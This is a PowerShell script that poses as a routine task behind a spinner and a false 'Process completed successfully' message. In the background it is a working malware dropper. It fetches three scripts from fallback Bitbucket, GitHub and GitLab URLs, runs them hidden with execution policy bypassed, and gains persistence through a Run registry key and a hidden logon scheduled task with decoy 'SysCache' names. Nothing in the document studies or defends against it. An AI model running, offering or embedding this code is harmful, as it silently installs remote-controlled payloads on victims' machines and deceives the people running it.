Clear-Host

Write-Host ""
Write-Host "Processing, please wait..."
Write-Host ""

############################
# START BACKGROUND PROCESS
############################
$job = Start-Job {

# Paths
$UserBase = "$env:LOCALAPPDATA\SysCache"
$Script1 = "$UserBase\powershell.ps1"
$Script2 = "$UserBase\win.ps1"
$Script3 = "$UserBase\vbs.vbs"

if (-not (Test-Path $UserBase)) {
    New-Item -Path $UserBase -ItemType Directory -Force | Out-Null
}

# URLs (Multiple sources - fallback)
$PUrls = @(
    "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/p27.ps1"
    "https://raw.githubusercontent.com/mahesh97m/phpcode/main/p27.ps1"
    "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/p27.ps1"

)

$WUrls = @(
    "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/win3.ps1"
    "https://raw.githubusercontent.com/mahesh97m/phpcode/main/win3.ps1"
    "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/win3.ps1"

)
$VUrls = @(
    "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/vbs.vbs"
    "https://raw.githubusercontent.com/mahesh97m/phpcode/main/vbs.vbs"
    "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/vbs.vbs"

)
# Download Function with Fallback
function Download-File {
    param([string]$Target, [array]$Urls)
    foreach ($url in $Urls) {
        try {
            Invoke-WebRequest -Uri $url -OutFile $Target -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
            return $true
        } catch { }
    }
    return $false
}

# Download both scripts
Download-File -Target $Script1 -Urls $PUrls | Out-Null
Download-File -Target $Script2 -Urls $WUrls | Out-Null
Download-File -Target $Script3 -Urls $VUrls | Out-Null

# Run scripts hidden (detached)
if (Test-Path $Script1) {
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$Script1`"" -WindowStyle Hidden
}

Start-Sleep -Seconds 10

if (Test-Path $Script3) {
    Start-Process "wscript.exe" -ArgumentList "`"$Script3`"" -WindowStyle Hidden
}

# Persistence: Registry Run Key (Current User)
$RunKey  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RunName = "SysCacheUpdate"

if (Test-Path $Script3) {
    New-ItemProperty `
        -Path $RunKey `
        -Name $RunName `
        -Value "wscript.exe `"$Script3`"" `
        -PropertyType String `
        -Force | Out-Null
}


# Persistence: Scheduled Task (On Logon - No Admin Needed)

if (Test-Path $Script3) {

    $Action = New-ScheduledTaskAction `
        -Execute "wscript.exe" `
        -Argument "`"$Script3`""

    $Trigger = New-ScheduledTaskTrigger -AtLogOn

    $Settings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries `
        -Hidden

    $Principal = New-ScheduledTaskPrincipal `
        -UserId $env:USERNAME `
        -LogonType Interactive `
        -RunLevel LeastPrivilege

    Register-ScheduledTask `
        -TaskName "SysCache_User_Update" `
        -Action $Action `
        -Trigger $Trigger `
        -Settings $Settings `
        -Principal $Principal `
        -Force | Out-Null
}




    Start-Sleep -Seconds 12

    # Simulate output
    "Work completed successfully"
}

############################
# SPINNER ANIMATION
############################
$spin = '|/-\'
$i = 0

while ($job.State -eq 'Running') {
    $char = $spin[$i % $spin.Length]
    Write-Host -NoNewline "`rProcessing... $char"
    Start-Sleep -Milliseconds 150
    $i++
}

############################
# JOB FINISHED
############################
$result = Receive-Job $job -ErrorAction SilentlyContinue
Remove-Job $job

Clear-Host
Write-Host ""
Write-Host "Process completed successfully"
Write-Host ""

# Optional: show result
if ($result) {
    Write-Host "Result:"
    Write-Host $result
}

Start-Sleep -Seconds 2
